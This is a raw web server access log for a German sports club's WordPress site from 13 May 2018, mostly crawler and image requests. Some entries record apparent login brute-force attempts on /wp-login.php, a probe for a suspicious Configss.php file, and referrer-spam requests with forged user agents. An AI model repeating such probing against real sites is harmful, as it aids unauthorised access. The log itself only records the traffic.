195.133.145.199 - - [13/May/2018:03:39:53 +0200] "HEAD / HTTP/1.1" 301 - www.fc-schnaittach.de "http://medicaltranslate.ru" "Mozilla/5.0 (compatible; MSIE4.00; Windows 2009)" "-"
54.36.148.14 - - [13/May/2018:03:42:56 +0200] "GET /weihnachtsfeier-2016/ HTTP/1.1" 200 6926 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
35.205.53.99 - - [13/May/2018:03:43:26 +0200] "GET /wp-content/uploads/2017/09/SAM_1659-300x225.jpg HTTP/1.1" 200 20551 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)" "-"
54.36.149.66 - - [13/May/2018:03:47:05 +0200] "GET /tag/karate/ HTTP/1.1" 200 6262 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
66.249.64.203 - - [13/May/2018:03:47:09 +0200] "GET / HTTP/1.1" 200 7770 www.fc-schnaittach.de "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
157.55.39.139 - - [13/May/2018:03:50:03 +0200] "GET /wp-content/uploads/2014/10/P1160515-243x300.jpg HTTP/1.1" 301 285 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.139 - - [13/May/2018:03:50:49 +0200] "GET /wp-content/uploads/2014/10/P1160515-243x300.jpg HTTP/1.1" 200 12386 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.87 - - [13/May/2018:03:54:30 +0200] "GET /wp-content/uploads/2014/10/TT-Herren1_bearbeitet.jpg HTTP/1.1" 301 290 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.87 - - [13/May/2018:03:54:35 +0200] "GET /wp-content/uploads/2014/10/TT-Herren1_bearbeitet.jpg HTTP/1.1" 200 74839 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
91.229.111.51 - - [13/May/2018:03:58:07 +0200] "GET /wp-login.php HTTP/1.1" 301 250 fc-schnaittach.de "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.229.111.51 - - [13/May/2018:03:58:19 +0200] "GET /wp-login.php HTTP/1.1" 200 2793 www.fc-schnaittach.de "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.229.111.51 - - [13/May/2018:03:58:31 +0200] "POST /wp-login.php HTTP/1.1" 503 299 www.fc-schnaittach.de "https://www.fc-schnaittach.de/wp-login.php" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
66.249.64.205 - - [13/May/2018:04:00:02 +0200] "GET /dragonrun/ HTTP/1.1" 200 9133 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
87.250.233.77 - - [13/May/2018:04:01:20 +0200] "GET /robots.txt HTTP/1.1" 200 35 fc-schnaittach.de "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
87.250.244.6 - - [13/May/2018:04:01:24 +0200] "GET /wp-content/themes/fcs/images/production/FcsWappen.ico?ver=1420564287 HTTP/1.1" 200 4606 fc-schnaittach.de "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
66.249.64.207 - - [13/May/2018:04:02:02 +0200] "GET /einladung-zur-mitgliederversammlung-2018/ HTTP/1.1" 200 6451 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
157.55.39.87 - - [13/May/2018:04:14:43 +0200] "GET /wp-content/uploads/2015/11/Spielbericht-300x200.jpg HTTP/1.1" 200 25190 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.150.78.239 - - [13/May/2018:04:16:49 +0200] "GET /wp-login.php HTTP/1.1" 301 250 fc-schnaittach.de "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
217.150.78.239 - - [13/May/2018:04:17:01 +0200] "GET /wp-login.php HTTP/1.1" 200 2793 www.fc-schnaittach.de "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
217.150.78.239 - - [13/May/2018:04:17:13 +0200] "POST /wp-login.php HTTP/1.1" 503 299 www.fc-schnaittach.de "https://www.fc-schnaittach.de/wp-login.php" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
207.46.13.165 - - [13/May/2018:04:18:55 +0200] "GET /wp-content/uploads/2016/12/IMG_9907.jpg HTTP/1.1" 301 277 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.165 - - [13/May/2018:04:19:00 +0200] "GET /wp-content/uploads/2016/12/IMG_9907.jpg HTTP/1.1" 200 1344398 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
193.106.30.99 - - [13/May/2018:04:26:40 +0200] "GET /Configss.php?check=1 HTTP/1.1" 301 23 fc-schnaittach.de "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
217.160.63.10 - - [13/May/2018:04:26:41 +0200] "POST /wp-cron.php?doing_wp_cron=1526178401.0240430831909179687500 HTTP/1.1" 301 297 www.fc-schnaittach.de "http://www.fc-schnaittach.de/wp-cron.php?doing_wp_cron=1526178401.0240430831909179687500" "WordPress/4.9.5; https://www.fc-schnaittach.de" "-"
193.106.30.99 - - [13/May/2018:04:27:10 +0200] "GET /Configss.php?check=1 HTTP/1.1" 404 5762 www.fc-schnaittach.de "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
54.36.148.51 - - [13/May/2018:04:48:45 +0200] "GET /wp-content/uploads/2014/10/N_Schmitz.jpg HTTP/1.1" 200 136119 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
217.160.63.10 - - [13/May/2018:04:54:04 +0200] "POST /wp-cron.php?doing_wp_cron=1526180044.4407970905303955078125 HTTP/1.1" 301 297 www.fc-schnaittach.de "http://www.fc-schnaittach.de/wp-cron.php?doing_wp_cron=1526180044.4407970905303955078125" "WordPress/4.9.5; https://www.fc-schnaittach.de" "-"
46.119.118.96 - - [13/May/2018:04:54:04 +0200] "GET /karate-teilnahme-an-der-bezirksmeisterschaft-2015/ HTTP/1.1" 200 29768 www.fc-schnaittach.de "http://sorus.ucoz.ru/" "Mozilla/4.0 (compatible; Powermarks/3.5; Windows 95/98/2000/NT)" "-"
46.119.118.96 - - [13/May/2018:04:54:04 +0200] "GET /karate-teilnahme-an-der-bezirksmeisterschaft-2015/ HTTP/1.1" 200 29768 www.fc-schnaittach.de "http://sorus.ucoz.ru/" "Mozilla/4.0 (compatible; Powermarks/3.5; Windows 95/98/2000/NT)" "-"
54.36.148.139 - - [13/May/2018:04:58:58 +0200] "GET /unterstuetzt-unsere-mannschaften/ HTTP/1.1" 200 6419 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
217.160.63.10 - - [13/May/2018:04:58:59 +0200] "POST /wp-cron.php?doing_wp_cron=1526180339.1161029338836669921875 HTTP/1.1" 200 23 www.fc-schnaittach.de "https://www.fc-schnaittach.de/wp-cron.php?doing_wp_cron=1526180339.1161029338836669921875" "WordPress/4.9.5; https://www.fc-schnaittach.de" "-"
151.80.39.143 - - [13/May/2018:04:59:45 +0200] "GET /robots.txt HTTP/1.1" 301 248 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
151.80.39.143 - - [13/May/2018:04:59:46 +0200] "GET /robots.txt HTTP/1.1" 200 35 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
54.36.148.102 - - [13/May/2018:04:59:46 +0200] "GET /tischtennis/herren-3/ HTTP/1.1" 200 6900 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
66.249.64.207 - - [13/May/2018:05:10:52 +0200] "GET /g-jugend/ HTTP/1.1" 200 7152 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.64.203 - - [13/May/2018:05:11:13 +0200] "GET /sitemap-pt-post-2017-03.xml HTTP/1.1" 200 597 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.64.205 - - [13/May/2018:05:11:40 +0200] "GET /wp-content/uploads/2018/03/DIN_A6_Flyer_22.02.2018_1.png HTTP/1.1" 304 - www.fc-schnaittach.de "-" "Googlebot-Image/1.0" "-"
35.156.236.71 - - [13/May/2018:05:12:41 +0200] "GET /robots.txt HTTP/1.1" 301 248 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Cliqzbot/2.0; +http://cliqz.com/company/cliqzbot)" "-"
35.156.236.71 - - [13/May/2018:05:12:41 +0200] "GET /robots.txt HTTP/1.1" 200 35 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Cliqzbot/2.0; +http://cliqz.com/company/cliqzbot)" "-"
35.156.236.71 - - [13/May/2018:05:12:42 +0200] "GET /g-jugend HTTP/1.1" 301 23 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Cliqzbot/2.0; +http://cliqz.com/company/cliqzbot)" "-"
35.156.236.71 - - [13/May/2018:05:12:42 +0200] "GET /planung-pruefung-fruehjahr-2016 HTTP/1.1" 301 23 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Cliqzbot/2.0; +http://cliqz.com/company/cliqzbot)" "-"
35.156.236.71 - - [13/May/2018:05:12:43 +0200] "GET /g-jugend/ HTTP/1.1" 200 7154 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Cliqzbot/2.0; +http://cliqz.com/company/cliqzbot)" "-"
35.156.236.71 - - [13/May/2018:05:12:43 +0200] "GET /planung-pruefung-fruehjahr-2016/ HTTP/1.1" 200 6961 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Cliqzbot/2.0; +http://cliqz.com/company/cliqzbot)" "-"
54.36.148.166 - - [13/May/2018:05:14:06 +0200] "GET /tag/tischtennis/ HTTP/1.1" 200 5690 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
207.46.13.135 - - [13/May/2018:05:16:46 +0200] "GET /wp-content/uploads/2014/10/FCS1.jpg HTTP/1.1" 301 273 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.135 - - [13/May/2018:05:16:59 +0200] "GET /wp-content/uploads/2014/10/FCS1.jpg HTTP/1.1" 200 108565 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
13.230.241.255 - - [13/May/2018:05:17:16 +0200] "GET / HTTP/1.1" 301 238 fc-schnaittach.de "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36" "-"
13.230.241.255 - - [13/May/2018:05:17:19 +0200] "GET / HTTP/1.1" 200 7771 www.fc-schnaittach.de "http://fc-schnaittach.de" "Go 1.1 package http" "-"
54.36.149.47 - - [13/May/2018:05:17:48 +0200] "GET /tag/zugang/ HTTP/1.1" 200 5692 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
217.160.63.10 - - [13/May/2018:05:23:47 +0200] "POST /wp-cron.php?doing_wp_cron=1526181827.7224109172821044921875 HTTP/1.1" 200 23 www.fc-schnaittach.de "https://www.fc-schnaittach.de/wp-cron.php?doing_wp_cron=1526181827.7224109172821044921875" "WordPress/4.9.5; https://www.fc-schnaittach.de" "-"
66.249.64.207 - - [13/May/2018:05:23:47 +0200] "GET /maiausflug-der-wanderabteilung-des-1-fc-schnaittach/sam_1762-002/ HTTP/1.1" 200 196 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
157.55.39.87 - - [13/May/2018:05:34:59 +0200] "GET /wp-content/uploads/2015/03/Marina-W%C3%B6rrlein.jpg HTTP/1.1" 301 289 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.87 - - [13/May/2018:05:35:01 +0200] "GET /wp-content/uploads/2015/03/Marina-W%c3%b6rrlein.jpg HTTP/1.1" 200 708326 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
66.249.64.198 - - [13/May/2018:05:36:47 +0200] "GET /wp-content/plugins/recently-updated-posts-widget/css/style.css?ver=4.9.4 HTTP/1.1" 301 310 www.fc-schnaittach.de "http://www.fc-schnaittach.de/tag/sportheim/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.64.205 - - [13/May/2018:05:37:12 +0200] "GET /wp-content/plugins/recently-updated-posts-widget/css/style.css?ver=4.9.4 HTTP/1.1" 200 45 www.fc-schnaittach.de "http://www.fc-schnaittach.de/tag/sportheim/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
54.226.123.103 - - [13/May/2018:05:37:36 +0200] "GET / HTTP/1.1" 301 238 www.fc-schnaittach.de "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36" "-"
54.226.123.103 - - [13/May/2018:05:37:37 +0200] "GET / HTTP/1.1" 200 7770 www.fc-schnaittach.de "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36" "-"
66.249.64.200 - - [13/May/2018:05:40:49 +0200] "GET /sitemap-pt-page-2017-10.xml HTTP/1.1" 200 491 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
188.190.200.31 - - [13/May/2018:05:45:15 +0200] "POST /wp-login.php HTTP/1.1" 301 250 fc-schnaittach.de "http://fc-schnaittach.de/wp-login.php" "Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.8.131 Version/11.10" "-"
66.249.64.207 - - [13/May/2018:05:45:55 +0200] "GET / HTTP/1.1" 200 7771 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
77.220.214.180 - - [13/May/2018:05:47:12 +0200] "HEAD / HTTP/1.1" 301 - www.fc-schnaittach.de "https://mhp.su/catalog/preparaty-ot-saharnogo-diabeta" "Mozilla/7.0 (compatible; MSIE7.00; Windows 2004)" "-"
77.220.213.173 - - [13/May/2018:05:47:12 +0200] "HEAD / HTTP/1.1" 301 - www.fc-schnaittach.de "http://dompechey.by/catalog/optimum" "Mozilla/5.0 (compatible; MSIE5.00; Windows 2006)" "-"
185.154.13.6 - - [13/May/2018:05:47:12 +0200] "HEAD / HTTP/1.1" 301 - www.fc-schnaittach.de "https://pamjatnik.com.ua/catalog" "Mozilla/6.0 (compatible; MSIE3.00; Windows 2009)" "-"
178.159.39.237 - - [13/May/2018:05:47:18 +0200] "HEAD / HTTP/1.1" 301 - www.fc-schnaittach.de "http://spravkavspb.work/vidy-spravok/spravka-ot-otolaringologa/" "Mozilla/8.0 (compatible; MSIE2.00; Windows 2003)" "-"
178.159.43.212 - - [13/May/2018:05:48:13 +0200] "HEAD / HTTP/1.1" 301 - www.fc-schnaittach.de "https://www.translationcorporation.kiev.ua/" "Mozilla/2.0 (compatible; MSIE2.00; Windows 2005)" "-"
207.46.13.165 - - [13/May/2018:05:56:55 +0200] "GET /wp-content/uploads/2015/04/Ehrenabend-ALLE2.jpg HTTP/1.1" 301 285 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.165 - - [13/May/2018:05:57:13 +0200] "GET /wp-content/uploads/2015/04/Ehrenabend-ALLE2.jpg HTTP/1.1" 200 15594 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
185.236.130.56 - - [13/May/2018:05:58:00 +0200] "HEAD / HTTP/1.1" 301 - www.fc-schnaittach.de "http://kabinet-platon.ru" "Mozilla/2.0 (compatible; MSIE4.00; Windows 2004)" "-"
185.236.130.120 - - [13/May/2018:05:58:00 +0200] "HEAD / HTTP/1.1" 301 - www.fc-schnaittach.de "http://kabinet-nalog.ru" "Mozilla/3.0 (compatible; MSIE5.00; Windows 2005)" "-"
62.2.217.3 - - [13/May/2018:06:01:21 +0200] "GET /Dragonrun HTTP/1.1" 301 23 fc-schnaittach.de "http://www.laufkalender24.de/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "-"
62.2.217.3 - - [13/May/2018:06:01:21 +0200] "GET /Dragonrun/ HTTP/1.1" 200 9133 www.fc-schnaittach.de "http://www.laufkalender24.de/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "-"
46.119.118.96 - - [13/May/2018:06:01:54 +0200] "GET /karate-teilnahme-an-der-bezirksmeisterschaft-2015/ HTTP/1.1" 200 29768 www.fc-schnaittach.de "http://pk-services.ru/" "Opera/7.11 (Windows NT 5.1; U) [en]" "-"
46.119.118.96 - - [13/May/2018:06:01:55 +0200] "GET /karate-teilnahme-an-der-bezirksmeisterschaft-2015/ HTTP/1.1" 200 29768 www.fc-schnaittach.de "http://pk-services.ru/" "Opera/7.11 (Windows NT 5.1; U) [en]" "-"
194.87.94.251 - - [13/May/2018:06:04:02 +0200] "HEAD / HTTP/1.1" 301 - www.fc-schnaittach.de "https://lifespeaker.ru/samye-dorogie-mashiny-v-mire.html" "Mozilla/4.0 (compatible; MSIE4.00; Windows 2002)" "-"
195.133.201.163 - - [13/May/2018:06:06:16 +0200] "HEAD / HTTP/1.1" 301 - www.fc-schnaittach.de "http://kabinet-pfr.ru" "Mozilla/3.0 (compatible; MSIE2.00; Windows 2002)" "-"
35.233.64.186 - - [13/May/2018:06:09:40 +0200] "GET /wp-content/uploads/2014/10/Mannschaftsbild-16_17-mit-Verantwortlichen.jpg HTTP/1.1" 301 311 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)" "-"
35.233.64.186 - - [13/May/2018:06:09:40 +0200] "GET /wp-content/uploads/2014/10/Mannschaftsbild-16_17-mit-Verantwortlichen.jpg HTTP/1.1" 200 1967145 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)" "-"
54.36.149.50 - - [13/May/2018:06:10:57 +0200] "GET /wp-content/uploads/2015/03/P1020751.jpg HTTP/1.1" 200 36997 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
194.87.236.223 - - [13/May/2018:06:13:39 +0200] "HEAD / HTTP/1.1" 301 - www.fc-schnaittach.de "http://ru-online-vtb.ru" "Mozilla/8.0 (compatible; MSIE7.00; Windows 2008)" "-"
46.229.168.82 - - [13/May/2018:06:17:05 +0200] "GET /robots.txt HTTP/1.1" 301 248 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)" "-"
46.229.168.82 - - [13/May/2018:06:17:05 +0200] "GET /robots.txt HTTP/1.1" 200 35 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)" "-"
66.249.64.207 - - [13/May/2018:06:17:25 +0200] "GET / HTTP/1.1" 200 7771 www.fc-schnaittach.de "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
207.46.13.165 - - [13/May/2018:06:19:26 +0200] "GET /fussball-probetraining/ HTTP/1.1" 200 6455 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.19 - - [13/May/2018:06:19:40 +0200] "GET /wp-content/themes/fcs/style.css?ver=1460744932 HTTP/1.1" 200 22587 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.160.63.10 - - [13/May/2018:06:23:15 +0200] "HEAD /wp-content/uploads/2015/02/DSC02793-300x225.jpg HTTP/1.1" 301 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:15 +0200] "HEAD /wp-content/uploads/2015/02/DSC02793-300x225.jpg HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
66.249.64.207 - - [13/May/2018:06:23:15 +0200] "GET /dragonrun/ HTTP/1.1" 200 9134 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
217.160.63.10 - - [13/May/2018:06:23:17 +0200] "HEAD /wp-content/uploads/2015/06/20150613_115354-300x277.jpg HTTP/1.1" 301 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:17 +0200] "HEAD /wp-content/uploads/2015/06/20150613_115354-300x277.jpg HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:19 +0200] "HEAD /wp-content/uploads/2016/12/IMG_9926.jpg HTTP/1.1" 301 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:19 +0200] "HEAD /wp-content/uploads/2016/12/IMG_9926.jpg HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:21 +0200] "HEAD /wp-content/uploads/2018/03/Gel%C3%A4ndekarte_8.png HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:25 +0200] "HEAD /wp-content/uploads/2018/03/Gel%C3%A4ndekarte_8-1024x594.png HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
207.46.13.19 - - [13/May/2018:06:23:30 +0200] "GET /wp-content/uploads/2015/06/WP_20150626_16_05_59_Pro.jpg HTTP/1.1" 301 293 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.160.63.10 - - [13/May/2018:06:23:30 +0200] "HEAD /wp-content/uploads/2015/06/WP_20150613_13_24_02_Pro-1024x577.jpg HTTP/1.1" 301 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:30 +0200] "HEAD /wp-content/uploads/2015/06/WP_20150613_13_24_02_Pro-1024x577.jpg HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:35 +0200] "HEAD /wp-content/uploads/2014/10/Mannschaftsbild-16_17-mit-Verantwortlichen.jpg HTTP/1.1" 301 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:35 +0200] "HEAD /wp-content/uploads/2014/10/Mannschaftsbild-16_17-mit-Verantwortlichen.jpg HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:40 +0200] "HEAD /wp-content/uploads/2016/12/IMG_9918-300x225.jpg HTTP/1.1" 301 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:40 +0200] "HEAD /wp-content/uploads/2016/12/IMG_9918-300x225.jpg HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
207.46.13.19 - - [13/May/2018:06:23:44 +0200] "GET /wp-content/uploads/2015/06/WP_20150626_16_05_59_Pro.jpg HTTP/1.1" 200 90813 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.160.63.10 - - [13/May/2018:06:23:45 +0200] "HEAD /wp-content/uploads/2015/07/IMG-20150628-WA0052-150x150.jpg HTTP/1.1" 301 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:45 +0200] "HEAD /wp-content/uploads/2015/07/IMG-20150628-WA0052-150x150.jpg HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:50 +0200] "HEAD /wp-content/uploads/2016/12/IMG_9908.jpg HTTP/1.1" 301 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:50 +0200] "HEAD /wp-content/uploads/2016/12/IMG_9908.jpg HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:57 +0200] "HEAD /wp-content/uploads/2016/08/13567217_1108260252579010_6066009343219602641_n.jpg HTTP/1.1" 301 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:23:57 +0200] "HEAD /wp-content/uploads/2016/08/13567217_1108260252579010_6066009343219602641_n.jpg HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:24:00 +0200] "HEAD /wp-content/uploads/2016/08/13557901_1108260302579005_185805577931487927_n-300x225.jpg HTTP/1.1" 301 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:24:00 +0200] "HEAD /wp-content/uploads/2016/08/13557901_1108260302579005_185805577931487927_n-300x225.jpg HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
